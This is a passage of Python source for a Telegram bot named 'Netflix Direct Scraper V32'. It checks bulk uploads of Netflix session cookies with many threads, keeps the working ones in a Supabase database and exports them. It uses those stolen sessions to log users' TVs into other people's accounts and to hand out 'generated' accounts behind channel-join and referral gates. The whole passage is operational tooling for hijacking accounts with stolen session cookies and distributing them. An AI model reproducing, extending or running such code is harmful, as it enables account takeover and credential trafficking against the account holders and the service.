        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')

    def _gate_check(user_id: int) -> bool:
        """Gate: admin always passes. Others need channel join only (no referral)."""
        if is_admin(user_id):
            return True
        if not check_sub(user_id):
            send_force_join(user_id)
            return False
        # Mark as unlocked once channels verified
        ref = _get_referral(str(user_id))
        if not ref.get("unlocked"):
            ref["unlocked"] = True
            ref["channel_verified"] = True
            _set_referral(str(user_id), ref)
        return True

    def _main_keyboard(user_id):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        if is_admin(user_id):
            kb.add("📩 Send Here (DM)")
            kb.add("📡 Send to Channel")
            kb.add("📺 TV Login", "🎁 Generate Netflix")
            kb.add("🔍 Free Check", "💎 Premium Check")
            kb.add("➕ Add Cookie", "👑 Manage Access")
            kb.add("📣 Broadcast", "👥 Users Stats")
            kb.add("🗑 Manage DB")
            kb.add("🛑 Stop System")
        else:
            # Regular users
            kb.add("🎁 Generate Netflix", "📺 TV Login")
            kb.add("🔍 Free Check", "💎 Premium Check")
        return kb

    @bot.message_handler(commands=['start'])
    def start(message):
        save_user(message.chat.id)
        uid = message.chat.id
        uid_str = str(uid)

        # Parse referral parameter FIRST so it's recorded before any checks.
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) > 1 and parts[1].strip().startswith("ref_"):
            try:
                referrer_id = str(int(parts[1].strip()[4:]))
                if referrer_id != uid_str:  # no self-referral
                    ref_data = _get_referral(uid_str)
                    if not ref_data.get("referred_by"):
                        ref_data["referred_by"] = referrer_id
                        _set_referral(uid_str, ref_data)
            except Exception:
                pass

        # Already unlocked users — skip ALL gating.
        if is_unlocked(uid):
            welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Here is how to use this bot:\n\n1️⃣ **Select a Mode** using the buttons below.\n2️⃣ **Send your Netflix Cookies** (Text or File).\n\n🍪 **Supported Format:**\n• `NetflixId=v2...`\n\n📝 **Example:**\n`NetflixId=v2.CT...`\n\n👇 **Select Mode to Begin:**")
            return bot.send_message(uid, welcome_msg, reply_markup=_main_keyboard(uid), parse_mode='Markdown')

        # Channel check (new/non-unlocked users only).
        if not check_sub(uid):
            return send_force_join(uid)

        # Channel OK — now check referral unlock.
        if not is_unlocked(uid):
            return send_referral_prompt(uid)

        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Here is how to use this bot:\n\n1️⃣ **Select a Mode** using the buttons below.\n2️⃣ **Send your Netflix Cookies** (Text or File).\n\n🍪 **Supported Format:**\n• `NetflixId=v2...`\n\n📝 **Example:**\n`NetflixId=v2.CT...`\n\n👇 **Select Mode to Begin:**")
        bot.send_message(uid, welcome_msg, reply_markup=_main_keyboard(uid), parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
    def verify_join(call):
        uid = call.message.chat.id
        uid_str = str(uid)

        # Already unlocked — no need to re-verify anything.
        if is_unlocked(uid):
            try: bot.delete_message(uid, call.message.message_id)
            except: pass
            bot.send_message(uid, "**✅ Already Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=_main_keyboard(uid), parse_mode='Markdown')
            return

        # Retry the live channel check up to 3 times (handles Telegram API lag).
        is_member = False
        for _attempt in range(3):
            try:
                all_joined = True
                for channel in CHANNELS:
                    stat = bot.get_chat_member(channel, uid).status
                    if stat not in ('creator', 'administrator', 'member', 'restricted'):
                        all_joined = False
                        break
                if all_joined:
                    is_member = True
                    break
            except Exception:
                pass
            if _attempt < 2:
                time.sleep(1)

        if not is_member:
            safe_answer(call.id, "❌ You haven't joined all channels yet!", show_alert=True)
            return

        # User has joined — delete the join prompt.
        try: bot.delete_message(uid, call.message.message_id)
        except: pass

        # Persist channel_verified so check_sub trusts it forever.
        ref_data = _get_referral(uid_str)
        ref_data["channel_verified"] = True

        # Credit referrer if applicable.
        referrer_id = ref_data.get("referred_by")
        if referrer_id and not ref_data.get("referral_credited"):
            ref_data["referral_credited"] = True
            _set_referral(uid_str, ref_data)
            # Unlock the referrer.
            r_data = _get_referral(referrer_id)
            r_data["referral_count"] = r_data.get("referral_count", 0) + 1
            if not r_data.get("unlocked"):
                r_data["unlocked"] = True
            _set_referral(referrer_id, r_data)
            # Notify referrer.
            try:
                bot.send_message(
                    int(referrer_id),
                    "🎉 *Referral Complete!*\n\nYour friend joined and verified ✅\nYour bot is now *UNLOCKED forever* 🔓\n\nSend /start to begin!",
                    parse_mode='Markdown'
                )
            except Exception:
                pass
        else:
            _set_referral(uid_str, ref_data)

        # Mark user as unlocked (no referral needed — channel join is enough)
        ref_data["unlocked"] = True
        _set_referral(uid_str, ref_data)

        bot.send_message(uid,
            "✅ *Verified! Welcome!*\n\n"
            "📺 *TV Login:* `/login CODE` in group\n"
            "🎁 *Get Account:* tap Generate Netflix\n"
            "🔍 *Check Cookie:* send your cookie",
            reply_markup=_main_keyboard(uid), parse_mode='Markdown')

    @bot.message_handler(commands=['login'])
    def group_tv_login(message):
        """Handle /login <code> in groups AND DMs."""
        # Work in both groups and private chats
        parts = (message.text or "").split(maxsplit=1)
        cmd = (parts[0].strip().lower().split("@")[0] if parts else "")
        if cmd != "/login":
            return

        if len(parts) < 2 or not parts[1].strip():
            return bot.reply_to(
                message,
                "📺 TV Login Guide:\n\nSend command like:\n`/login 12345678`\n\nAccepted formats:\n• `/login 12345678`\n• `/login 1234-5678`\n• `/login 1 2 3 4 5 6 7 8`",
                parse_mode='Markdown'
            )

        code_clean = re.sub(r'\D', '', parts[1])
        if len(code_clean) < 4 or len(code_clean) > 12:
            bot.reply_to(message, "❌ Invalid code. Send the code shown on your TV screen.\nExample: `/login 12345678`", parse_mode='Markdown')
            return

        uid = message.from_user.id if message.from_user else None

        # Channel join check (skip for admin)
        if uid and not is_admin(uid):
            not_joined = []
            for ch in CHANNELS:
                try:
                    stat = bot.get_chat_member(ch, uid).status
                    if stat in ('left', 'kicked', 'banned'):
                        not_joined.append(ch)
                except Exception:
                    pass  # assume joined on error
            if not_joined:
                mk = types.InlineKeyboardMarkup()
                for ch in not_joined:
                    mk.add(types.InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch.replace('@','')}"))
                try:
                    bot.reply_to(message,
                        "⚠️ *Join our channels first!*\nJoin below then try again 👇",
                        reply_markup=mk, parse_mode='Markdown')
                except Exception:
                    pass
                return

        # Acknowledge quickly
        status_msg = bot.reply_to(message, "⏳ Processing TV login...", parse_mode='Markdown')

        def _do_group_login():
            if not supabase:
                bot.edit_message_text("❌ Database not configured.", message.chat.id, status_msg.message_id)
                return
            try:
                res = supabase.table('netflix').select("*").limit(30).execute()
            except Exception as e:
                bot.edit_message_text(f"❌ DB error: {e}", message.chat.id, status_msg.message_id)
                return

            valid_nid = None
            valid_link3 = None
            if res.data:
                rows = list(res.data)
                random.shuffle(rows)
                for row in rows:
                    c = _db_row_cookie(row)
                    if not c:
                        continue
                    chk = check_cookie_fast(c)
                    if chk.get('valid'):
                        valid_nid = parse_smart_cookie(c)
                        valid_link3 = chk.get('link3')
                        break

            if not valid_nid:
                bot.edit_message_text("❌ No valid cookie available. Admin needs to add one.", message.chat.id, status_msg.message_id)
                return

            # TV Login via NFToken API (FIFO queued)
            result_text = None
            success = False
            user_name = message.from_user.first_name if message.from_user else "User"
            ts = datetime.now().strftime("%d %b %Y • %H:%M")

            ok, msg = _tv_activate_requests(valid_nid, code_clean, link3=valid_link3)
            if ok:
                result_text = (
                    f"✅ *TV LOGIN SUCCESS*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 *User:* {user_name}\n"
                    f"📺 *Code:* `{code_clean}`\n"
                    f"🕐 *Time:* {ts}\n\n"
                    f"🎉 Your TV is now connected to Netflix!\n"
                    f"🍿 Enjoy watching!\n\n"
                    f"📡 @F88UFNETFLIX"
                )
                success = True
            else:
                reason = _clean_api_msg(msg) if msg else "TV code expired. Get a fresh code."
                result_text = (
                    f"❌ *TV Login Failed*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 *User:* {user_name}\n"
                    f"📺 *Code:* `{code_clean}`\n"
                    f"🕐 *Time:* {ts}\n\n"
                    f"⚠️ *Reason:* {reason}\n\n"
                    f"💡 Get a fresh code from your TV and try again"
                )

            try:
                bot.edit_message_text(
                    result_text, message.chat.id, status_msg.message_id,
                    parse_mode='Markdown'
                )
            except Exception:
                try:
                    bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
                except Exception:
                    pass

        GLOBAL_EXECUTOR.submit(_do_group_login)

    @bot.message_handler(commands=['ban'])
    def cmd_ban(message):
        if not is_admin(message.chat.id): return
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            return bot.reply_to(message, "❌ Usage: `/ban <user_id>`\nExample: `/ban 123456789`", parse_mode='Markdown')
        uid = int(parts[1].strip())
        ban_user(uid)
        try: bot.send_message(uid, "🚫 **You have been banned from this bot by the admin.**", parse_mode='Markdown')
        except: pass
        bot.reply_to(message, f"✅ **User `{uid}` has been banned.**", parse_mode='Markdown')

    @bot.message_handler(commands=['unban'])
    def cmd_unban(message):
        if not is_admin(message.chat.id): return
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            return bot.reply_to(message, "❌ Usage: `/unban <user_id>`\nExample: `/unban 123456789`", parse_mode='Markdown')
        uid = int(parts[1].strip())
        unban_user(uid)
        try: bot.send_message(uid, "✅ **You have been unbanned. You can use the bot again.**", parse_mode='Markdown')
        except: pass
        bot.reply_to(message, f"✅ **User `{uid}` has been unbanned.**", parse_mode='Markdown')

    @bot.message_handler(commands=['grant'])
    def cmd_grant(message):
        if not is_admin(message.chat.id): return
        parts = (message.text or "").split()
        if len(parts) < 3 or not parts[1].isdigit():
            return bot.reply_to(message, "❌ Usage: `/grant <user_id> <hours>`\nUse `0` for lifetime.\nExample: `/grant 123456789 24`", parse_mode='Markdown')
        uid = int(parts[1])
        hours = int(parts[2]) if parts[2].isdigit() else 0
        if hours == 0:
            bulk_access[uid] = float('inf')
            label = "Lifetime"
        else:
            bulk_access[uid] = time.time() + hours * 3600
            label = f"{hours} Hour(s)"
        try: bot.send_message(uid, f"✅ **Bulk Access Granted!**\nYou can now check bulk cookies for **{label}**.", parse_mode='Markdown')
        except: pass
        bot.reply_to(message, f"✅ **Granted `{label}` bulk access to user `{uid}`.**", parse_mode='Markdown')

    @bot.message_handler(commands=['users', 'stats'])
    @bot.message_handler(func=lambda m: m.text == "👥 Users Stats")
    def user_stats(message):
        if not is_admin(message.chat.id): return
        try:
            count = 0
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, "r") as f: count = len(f.read().splitlines())
            db_count = 0
            if supabase:
                try: db_count = supabase.table('netflix').select("id", count="exact").execute().count or 0
                except: pass
            bot.reply_to(message, f"📊 **Total Users:** `{count}`\n🗄️ **Cookies in DB:** `{db_count}`\n🤖 **Bot:** Netflix Scraper V32", parse_mode='Markdown')
        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

    # ─── Admin: Add Cookie ──────────────────────────────────────────────────
    # Per-admin session totals so multiple files accumulate into one grand total.
    # "active": True means the session is open — all incoming docs/text are
    # auto-routed to the add-cookie handler without pressing the button again.
    _ac_sessions: dict = {}  # chat_id -> {"total", "valid", "dead", "err", "files", "active"}

    @bot.message_handler(commands=['addcookie'])
    @bot.message_handler(func=lambda m: m.text == "➕ Add Cookie")
    def add_cookie_start(message):
        if not is_admin(message.chat.id): return
        # Reset session totals for a fresh batch and mark as active
        _ac_sessions[message.chat.id] = {"total": 0, "valid": 0, "dead": 0, "err": 0, "files": 0, "active": True, "stopped": False, "skipped": 0, "lock": threading.Lock()}
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Done — Show Summary", callback_data="addcookie_done"),
            types.InlineKeyboardButton("🔙 Cancel", callback_data="addcookie_back"),
        )
        markup.add(types.InlineKeyboardButton("🚨 Emergency Stop", callback_data="addcookie_stop"))
        bot.send_message(
            message.chat.id,
            "📥 **Add Cookies to Database**\n\n"
            "Send any number of `.txt`, `.json`, or `.zip` files (all at once or one by one).\n"
            "Zip files may contain folders or nested zips — everything is scanned automatically.\n"
            "Each file is checked and valid Netflix cookies are saved immediately.\n"
            "When you're done, tap **✅ Done**.\n\n"
            "**Supported Cookie Formats:**\n"
            "• JSON array (Cookie-Editor export)\n"
            "• Semicolon-separated `NetflixId=v3...;...`\n"
            "• Netscape / Header format\n"
            "• Raw `NetflixId=v3...`",
            reply_markup=markup, parse_mode='Markdown'
        )

    @bot.callback_query_handler(func=lambda call: call.data == "addcookie_back")
    def addcookie_back(call):
        if not is_admin(call.from_user.id): return
        try: bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
        except: pass
        # Mark inactive first so any in-flight _process() jobs see it immediately
        existing = _ac_sessions.get(call.message.chat.id)
        if existing: existing["active"] = False
        _ac_sessions.pop(call.message.chat.id, None)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        bot.send_message(call.message.chat.id, "🏠 **Main Menu**", reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "addcookie_done")
    def addcookie_done(call):
        if not is_admin(call.from_user.id): return
        try: bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
        except: pass
        # Mark inactive first so any in-flight _process() jobs see it immediately
        existing = _ac_sessions.get(call.message.chat.id)
        if existing: existing["active"] = False
        sess = _ac_sessions.pop(call.message.chat.id, None)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        if sess and sess["files"] > 0:
            lines = [
                f"🏁 **Session Complete!**\n\n"
                f"📂 Files processed: `{sess['files']}`\n"
                f"📦 Total cookies found: `{sess['total']}`\n"
                f"✅ Valid → Saved: `{sess['valid']}`\n"
                f"❌ Dead → Discarded: `{sess['dead']}`"
            ]
            if sess["err"]:
                lines.append(f"⚠️ Valid but NOT Saved (DB error): `{sess['err']}`")
            bot.send_message(call.message.chat.id, "\n".join(lines),
                             reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')
        else:
            bot.send_message(call.message.chat.id, "🏠 **Main Menu**",
                             reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "addcookie_stop")
    def addcookie_stop(call):
        if not is_admin(call.from_user.id): return
        try: bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
        except: pass
        # Set stopped first so in-flight _check_and_save() workers exit ASAP
        existing = _ac_sessions.get(call.message.chat.id)
        if existing:
            existing["stopped"] = True
            existing["active"] = False
        sess = _ac_sessions.pop(call.message.chat.id, None)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        if sess and sess["files"] > 0:
            lines = [
                f"🚨 **Processing Stopped!**\n\n"
                f"📂 Files processed so far: `{sess['files']}`\n"
                f"📦 Cookies checked: `{sess['total']}`\n"
                f"✅ Saved before stop: `{sess['valid']}`\n"
                f"❌ Dead: `{sess['dead']}`"
            ]
            if sess.get("skipped", 0):
                lines.append(f"⏩ Skipped (stopped early): `{sess['skipped']}`")
            if sess["err"]:
                lines.append(f"⚠️ DB errors: `{sess['err']}`")
            bot.send_message(call.message.chat.id, "\n".join(lines),
                             reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')
        else:
            bot.send_message(call.message.chat.id, "🚨 **Processing stopped.**\n🏠 **Main Menu**",
                             reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')

    def handle_add_cookie_input(message):
        if not is_admin(message.chat.id): return
        # Ignore if session is no longer active (e.g. Done was pressed)
        if not _ac_sessions.get(message.chat.id, {}).get("active"):
            return

        def _process():
            raw_text = ""
            try:
                if message.content_type == 'document':
                    file_info = bot.get_file(message.document.file_id)
                    downloaded = bot.download_file(file_info.file_path)
                    raw_text = _extract_raw_text_from_download(
                        downloaded, message.document.file_name or ""
                    )
                elif message.content_type == 'text':
                    raw_text = message.text or ""
                else:
                    bot.send_message(
                        message.chat.id,
                        "❌ Please send a `.txt` / `.zip` file or paste cookie text.\n"
                        "Session is still active — send the next file or tap ✅ Done.",
                        parse_mode='Markdown'
                    )
                    return
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error reading file: {e}\nSend the next file or tap ✅ Done.")
                return

            candidates = extract_cookies_from_block(raw_text)
            if not candidates:
                bot.send_message(
                    message.chat.id,
                    "❌ **No cookies found** in this file.\n"
                    "Make sure it contains `NetflixId`.\nSend the next file or tap ✅ Done.",
                    parse_mode='Markdown'
                )
                return

            if not supabase:
                bot.send_message(message.chat.id, "❌ Database not configured.", parse_mode='Markdown')
                return

            fname_label = message.document.file_name if message.content_type == 'document' else "pasted text"
            status_msg = bot.send_message(
                message.chat.id,
                f"⏳ **Checking {len(candidates)} cookies from `{fname_label}`...**",
                parse_mode='Markdown'
            )
            valid_count = 0
            dead_count = 0
            error_count = 0
            done_count = 0
            db_table_missing_alerted = False
            count_lock = threading.Lock()

            def _check_and_save(cookie):
                nonlocal db_table_missing_alerted
                # Abort immediately if admin pressed Emergency Stop
                if _ac_sessions.get(message.chat.id, {}).get("stopped"):
                    return "skipped"
                chk = check_cookie_fast(cookie)
                if chk.get('valid'):
                    try:
                        nid_val = parse_smart_cookie(cookie)
                        clean_cookie = f"NetflixId={nid_val}" if nid_val else cookie
                        _ensure_db_table()
                        supabase.table('netflix').insert({"data": clean_cookie}).execute()
                        return "valid"
                    except Exception as db_err:
                        err_str = str(db_err)
                        if 'PGRST205' in err_str or 'schema cache' in err_str:
                            print("[AddCookie] DB table missing — run CREATE TABLE in Supabase SQL Editor.")
                            if not db_table_missing_alerted:
                                db_table_missing_alerted = True
                                try:
                                    bot.send_message(
                                        ADMIN_ID,
                                        "⚠️ **Database table missing!**\n\n"
                                        "The `public.netflix` table does not exist in your Supabase project.\n\n"
                                        "Run this SQL in your **Supabase SQL Editor** to create it:\n\n"
                                        "```sql\n"
                                        "CREATE TABLE IF NOT EXISTS public.netflix (\n"
                                        "  id BIGSERIAL PRIMARY KEY,\n"
                                        "  data TEXT NOT NULL,\n"
                                        "  created_at TIMESTAMPTZ DEFAULT NOW()\n"
                                        ");\n"
                                        "```\n\n"
                                        "✅ Valid cookies were found but could NOT be saved until the table is created.",
                                        parse_mode='Markdown'
                                    )
                                except Exception:
                                    pass
                        else:
                            print(f"[AddCookie] DB insert error: {db_err}")
                        return "error"
                return "dead"

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
                futures = {pool.submit(_check_and_save, c): c for c in candidates}
                skipped_count = 0
                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                    except Exception:
                        result = "error"
                    with count_lock:
                        if result == "valid":
                            valid_count += 1
                        elif result == "dead":
                            dead_count += 1
                        elif result == "skipped":
                            skipped_count += 1
                        elif result == "error":
                            error_count += 1
                        else:
                            error_count += 1
                        done_count += 1
                        cur_done = done_count
                        cur_valid = valid_count
                        cur_dead = dead_count
                        cur_err = error_count
                    if cur_done % 5 == 0 or cur_done == len(candidates):
                        try:
                            bot.edit_message_text(
                                f"⏳ **Checking `{fname_label}`... [{cur_done}/{len(candidates)}]**\n"
                                f"✅ Valid: {cur_valid} | ❌ Dead: {cur_dead}" +
                                (f" | ⚠️ DB Err: {cur_err}" if cur_err else ""),
                                message.chat.id, status_msg.message_id, parse_mode='Markdown'
                            )
                        except Exception:
                            pass

            # Update session running totals
            sess = _ac_sessions.get(message.chat.id)
            if sess is None or not sess.get("active"):
                # Session was closed while processing — just send a quiet summary
                bot.edit_message_text(
                    f"✅ **Done:** `{fname_label}` — Saved: `{valid_count}` | Dead: `{dead_count}`",
                    message.chat.id, status_msg.message_id, parse_mode='Markdown'
                )
                return

            # Atomically update session totals — multiple _process() threads may run concurrently
            with sess["lock"]:
                sess["total"] += len(candidates)
                sess["valid"] += valid_count
                sess["skipped"] = sess.get("skipped", 0) + skipped_count
                sess["dead"] += dead_count
                sess["err"] += error_count
                sess["files"] += 1
                total_valid_so_far = sess["valid"]
                files_so_far = sess["files"]

            # Per-file result — no need to re-register; all future files are caught by handle_input
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("✅ Done — Show Summary", callback_data="addcookie_done"),
                types.InlineKeyboardButton("🔙 Cancel", callback_data="addcookie_back"),
            )
            markup.add(types.InlineKeyboardButton("🚨 Emergency Stop", callback_data="addcookie_stop"))
            summary_parts = [
                f"📄 **File {files_so_far} done:** `{fname_label}`\n\n"
                f"📦 Found: `{len(candidates)}`  ✅ Saved: `{valid_count}`  ❌ Dead: `{dead_count}`"
            ]
            if error_count:
                summary_parts.append(f"⚠️ NOT Saved (DB error): `{error_count}`")
            summary_parts.append(
                f"\n🗃 **Total saved so far:** `{total_valid_so_far}` cookie(s)\n\n"
                "_Send more files or tap ✅ Done_"
            )
            try:
                bot.edit_message_text(
                    "\n".join(summary_parts),
                    message.chat.id, status_msg.message_id,
                    reply_markup=markup, parse_mode='Markdown'
                )
            except Exception:
                bot.send_message(
                    message.chat.id,
                    "\n".join(summary_parts),
                    reply_markup=markup, parse_mode='Markdown'
                )

        GLOBAL_EXECUTOR.submit(_process)

    # ─── Admin: Manage DB (view / deactivate cookies) ──────────────────────
    @bot.message_handler(func=lambda m: m.text == "🗑 Manage DB")
    def manage_db_menu(message):
        if not is_admin(message.chat.id): return
        _show_manage_db(message.chat.id)

    def _show_manage_db(chat_id, page=0, edit_msg_id=None):
        """Show paginated list of stored cookies with delete buttons."""
        if not supabase:
            bot.send_message(chat_id, "❌ Database not configured.")
            return
        try:
            total_res = supabase.table('netflix').select("id", count="exact").execute()
            total = total_res.count or 0
            PAGE_SIZE = 8
            offset = page * PAGE_SIZE
            rows_res = supabase.table('netflix').select("id, data").order("id").range(offset, offset + PAGE_SIZE - 1).execute()
            rows = rows_res.data or []
        except Exception as e:
            bot.send_message(chat_id, f"❌ DB error: {e}")
            return

        txt = f"🗄 **Cookie Database** — Total: `{total}`\n\n"
        markup = types.InlineKeyboardMarkup()
        for row in rows:
            nid = parse_smart_cookie(row.get('data', ''))
            short = (nid[:20] + "…") if nid and len(nid) > 20 else (nid or "?")
            txt += f"• `#{row['id']}` — `{short}`\n"
            markup.add(types.InlineKeyboardButton(
                f"🗑 Delete #{row['id']}", callback_data=f"dbdel_{row['id']}_{page}"
            ))

        # Pagination
        nav = []
        if page > 0:
            nav.append(types.InlineKeyboardButton("◀️ Prev", callback_data=f"dbpage_{page-1}"))
        if offset + PAGE_SIZE < total:
            nav.append(types.InlineKeyboardButton("Next ▶️", callback_data=f"dbpage_{page+1}"))
        if nav:
            markup.row(*nav)

        markup.row(
            types.InlineKeyboardButton("🗑 Delete ALL", callback_data="dbdel_all"),
            types.InlineKeyboardButton("📥 Export .txt", callback_data="dbexport"),
        )
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="dbback"))

        if edit_msg_id:
            try:
                bot.edit_message_text(txt, chat_id, edit_msg_id, reply_markup=markup, parse_mode='Markdown')
                return
            except Exception:
                pass
        bot.send_message(chat_id, txt, reply_markup=markup, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data.startswith("dbdel_") or
                                                   call.data.startswith("dbpage_") or
                                                   call.data in ("dbback", "dbexport"))
    def handle_manage_db(call):
        if not is_admin(call.from_user.id):
            safe_answer(call.id, "❌ Admin only!", show_alert=True)
            return
        cid = call.message.chat.id
        mid = call.message.message_id

        if call.data == "dbback":
            try: bot.delete_message(cid, mid)
            except: pass
            bot.send_message(cid, "🏠 **Main Menu**", reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')
            return

        if call.data == "dbexport":
            safe_answer(call.id, "⏳ Exporting…")
            try:
                rows_res = supabase.table('netflix').select("id, data").order("id").execute()
                rows = rows_res.data or []
                sep = "─" * 46
                lines = [f"NETFLIX COOKIES — Total: {len(rows)}", "=" * 46, ""]
                for i, row in enumerate(rows, 1):
                    nid = parse_smart_cookie(row.get('data', ''))
                    lines.append(f"#{i}  (DB id={row['id']})")
                    lines.append(f"NetflixId={nid}" if nid else row.get('data', ''))
                    lines.append(sep)
                    lines.append("")
                content = "\n".join(lines)
                with io.BytesIO(content.encode('utf-8')) as f:
                    f.name = f"Netflix_DB_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    bot.send_document(cid, f, caption=f"🗄 **{len(rows)} cookies exported from DB**", parse_mode='Markdown')
            except Exception as e:
                bot.send_message(cid, f"❌ Export error: {e}")
            return

        if call.data == "dbdel_all":
            try:
                # Delete all rows — Supabase requires a filter; use id >= 0
                supabase.table('netflix').delete().gte("id", 0).execute()
                safe_answer(call.id, "✅ All cookies deleted!")
                _show_manage_db(cid, page=0, edit_msg_id=mid)
            except Exception as e:
                safe_answer(call.id, f"❌ Error: {e}", show_alert=True)
            return

        if call.data.startswith("dbdel_"):
            parts = call.data.split("_")
            row_id = parts[1]
            page = int(parts[2]) if len(parts) > 2 else 0
            try:
                supabase.table('netflix').delete().eq("id", row_id).execute()
                safe_answer(call.id, f"✅ Cookie #{row_id} deleted")
                _show_manage_db(cid, page=page, edit_msg_id=mid)
            except Exception as e:
                safe_answer(call.id, f"❌ Error: {e}", show_alert=True)
            return

        if call.data.startswith("dbpage_"):
            page = int(call.data.split("_")[1])
            _show_manage_db(cid, page=page, edit_msg_id=mid)

    # ─── Admin: Manage Bulk Access ──────────────────────────────────────────
    @bot.message_handler(commands=['manage'])
    @bot.message_handler(func=lambda m: m.text == "👑 Manage Access")
    def manage_access_menu(message):
        if not is_admin(message.chat.id): return
        _show_manage_access(message.chat.id)

    def _show_manage_access(chat_id, edit_msg_id=None):
        now = time.time()
        active = {uid: exp for uid, exp in bulk_access.items() if exp > now}
        banned_list = list(banned_users)[:5]

        txt = "👑 **User Management Panel**\n\n"

        if active:
            txt += "**✅ Bulk Access Users:**\n"
            markup = types.InlineKeyboardMarkup()
            for uid, exp in list(active.items())[:10]:
                exp_str = "♾️ Lifetime" if exp == float('inf') else datetime.fromtimestamp(exp).strftime('%d-%b %H:%M')
                txt += f"👤 `{uid}` — expires {exp_str}\n"
                markup.row(
                    types.InlineKeyboardButton(f"⏱ Change {uid}", callback_data=f"mgr_change_{uid}"),
                    types.InlineKeyboardButton(f"❌ Revoke {uid}", callback_data=f"mgr_revoke_{uid}")
                )
        else:
            txt += "_No users with active bulk access._\n"
            markup = types.InlineKeyboardMarkup()

        if banned_list:
            txt += "\n**🚫 Banned Users:**\n"
            for uid in banned_list:
                txt += f"🚫 `{uid}`\n"
                markup.add(types.InlineKeyboardButton(f"✅ Unban {uid}", callback_data=f"mgr_unban_{uid}"))
        else:
            txt += "\n_No banned users._\n"

        markup.row(
            types.InlineKeyboardButton("🚫 Ban User", callback_data="mgr_ban"),
            types.InlineKeyboardButton("➕ Grant Access", callback_data="mgr_grant")
        )
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="manage_back"))

        if edit_msg_id:
            try: bot.edit_message_text(txt, chat_id, edit_msg_id, reply_markup=markup, parse_mode='Markdown')
            except: bot.send_message(chat_id, txt, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, txt, reply_markup=markup, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data.startswith("mgr_") or call.data == "manage_back")
    def handle_manage_access(call):
        if not is_admin(call.from_user.id):
            safe_answer(call.id, "❌ Admin only!", show_alert=True)
            return
        if call.data == "manage_back":
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            bot.send_message(call.message.chat.id, "🏠 **Main Menu**", reply_markup=_main_keyboard(ADMIN_ID), parse_mode='Markdown')
            return
        if call.data.startswith("mgr_revoke_"):
            uid = int(call.data.replace("mgr_revoke_", ""))
            bulk_access.pop(uid, None)
            safe_answer(call.id, f"✅ Revoked access for {uid}")
            try: bot.send_message(uid, "⚠️ **Your bulk access has been revoked by admin.**", parse_mode='Markdown')
            except: pass
            _show_manage_access(call.message.chat.id, call.message.message_id)
        elif call.data.startswith("mgr_change_"):
            uid = int(call.data.replace("mgr_change_", ""))
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("1 Hour", callback_data=f"mgr_set_{uid}_1"),
                types.InlineKeyboardButton("5 Hours", callback_data=f"mgr_set_{uid}_5"),
                types.InlineKeyboardButton("10 Hours", callback_data=f"mgr_set_{uid}_10"),
            )
            markup.row(
                types.InlineKeyboardButton("24 Hours", callback_data=f"mgr_set_{uid}_24"),
                types.InlineKeyboardButton("♾️ Lifetime", callback_data=f"mgr_set_{uid}_0"),
            )
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="mgr_list"))
            try: bot.edit_message_text(f"⏱ **Set new duration for** `{uid}`:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
            except: pass
        elif call.data.startswith("mgr_set_"):
            parts = call.data.split("_")
            uid = int(parts[2])
            hours = int(parts[3])
            if hours == 0:
                bulk_access[uid] = float('inf')
                label = "Lifetime"
            else:
                bulk_access[uid] = time.time() + hours * 3600
                label = f"{hours} Hour(s)"
            safe_answer(call.id, f"✅ Updated to {label}")
            try:
                bot.send_message(uid, f"✅ **Your bulk access has been updated to {label}!**", parse_mode='Markdown')
            except: pass
            _show_manage_access(call.message.chat.id, call.message.message_id)
        elif call.data == "mgr_list":
            _show_manage_access(call.message.chat.id, call.message.message_id)
        elif call.data.startswith("mgr_unban_"):
            uid_str = call.data[len("mgr_unban_"):]
            unban_user(uid_str)
            safe_answer(call.id, f"✅ Unbanned {uid_str}")
